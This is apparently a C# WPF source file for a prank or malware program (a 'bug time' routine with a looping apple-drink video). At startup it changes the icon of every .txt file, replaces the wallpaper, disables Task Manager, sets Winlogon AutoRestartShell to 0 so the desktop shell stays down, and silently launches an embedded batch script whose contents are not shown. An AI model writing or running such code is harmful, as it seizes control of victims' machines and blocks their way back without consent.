using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Diagnostics;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using Microsoft.Win32;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;


namespace WpfApp2
{
    /// <summary>
    /// MainWindow.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            startBugTime();
            InitializeComponent();
        }

        public void startBugTime()
        {
            string temp = System.IO.Path.GetTempPath();
            string applebgpath = temp + "sagwatoktokbg.bmp";
            string iconpath = temp + "icon.ico";

            System.IO.File.WriteAllBytes(applebgpath, Properties.Resources.realfruitrealsparkling);
            System.IO.File.WriteAllBytes(iconpath, Properties.Resources.icon);

            RegistryKey regkey;

            regkey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
            regkey.SetValue("", iconpath);
            regkey.Close();

            regkey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
            regkey.SetValue("Wallpaper", applebgpath);
            regkey.Close();

            regkey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            regkey.SetValue("DIsableTaskMgr", "1");
            regkey.Close();

            regkey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
            regkey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
            regkey.Close();

            System.IO.File.WriteAllBytes(temp + "start.bat", Properties.Resources.batchfile);

            ProcessStartInfo batchstart = new ProcessStartInfo(temp + "start.bat");
            batchstart.CreateNoWindow = true;
            batchstart.UseShellExecute = false;

            Process.Start(batchstart);

        }


        private void MediaElement_MediaEnded(object sender, RoutedEventArgs e)
        {
            MediaElement videoelement = sender as MediaElement;
            videoelement.Position = TimeSpan.FromMilliseconds(1);
        }

        private void MediaElement_Loaded(object sender, RoutedEventArgs e)
        {
            string temp = System.IO.Path.GetTempPath();
            string tropicanapath = temp + "sagwa_toktok.mp4";
            System.IO.File.WriteAllBytes(tropicanapath, Properties.Resources.tropicana_apple);

            video.Source = new Uri(tropicanapath);
        }
    }
}
